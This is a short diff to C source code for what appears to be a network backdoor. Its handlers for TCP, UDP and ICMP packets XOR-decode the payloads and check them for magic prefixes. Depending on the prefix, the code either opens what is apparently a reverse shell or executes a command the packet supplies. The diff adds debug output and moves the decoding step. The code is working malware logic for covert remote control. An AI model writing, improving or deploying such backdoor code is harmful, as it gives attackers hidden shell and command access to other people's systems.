@@ -7,11 +7,17 @@ void compare(int payloadLength, char* data)
 		if (strncmp(data, SHELL, 6) == 0)
 		{
 			char* rip = (char*)data + 6;
+#ifdef DEBUG
+			printf("%s", data);
+#endif
 			rev(rip);
 		}
 		else if (strncmp(data, COMMAND, 6) == 0)
 		{
 			char* cmd = (char*)data + 6;
+#ifdef DEBUG
+			printf("%s", data);
+#endif
 			exec(cmd);
 		}
 	}
@@ -28,10 +34,10 @@ void handleTCP(char* buffer, struct ip_hdr_s* ip_header) {
 		{
 			char* data = (char*)(buffer + BUFFER_OFFSET_TCP_DATA);
 			int payloadLength = ntohs(ip_header->ip_len) - IP_HEADER_SIZE - BUFFER_SIZE_TCP;
-			data[payloadLength - 1] = '\0';
 #ifdef DEBUG
             XORCipher(data, XOR_KEY, payloadLength);
 #endif
+			data[payloadLength - 1] = '\0';
 			compare(payloadLength, data);
 		}
 	}
@@ -45,6 +51,9 @@ void handleUDP(char* buffer, struct ip_hdr_s* ip_header) {
 	{
 		char* data = (char*)(buffer + BUFFER_OFFSET_UDP_DATA);
 		int payloadLength = ntohs(ip_header->ip_len) - IP_HEADER_SIZE - BUFFER_SIZE_UDP;
+#ifdef DEBUG
+            XORCipher(data, XOR_KEY, payloadLength);
+#endif
 		data[payloadLength - 1] = '\0';
 		compare(payloadLength, data);
 	}
@@ -59,6 +68,10 @@ void handleICMP(char* buffer, struct ip_hdr_s* ip_header) {
 	{
 		char* data = (char*)(buffer + BUFFER_OFFSET_ICMP_DATA);
 		int payloadLength = ntohs(ip_header->ip_len) - IP_HEADER_SIZE - BUFFER_SIZE_ICMP;
+#ifdef DEBUG
+			printf("%s", data);
+            XORCipher(data, XOR_KEY, payloadLength);
+#endif
 		data[payloadLength - 1] = '\0';
 		compare(payloadLength, data);
 	}
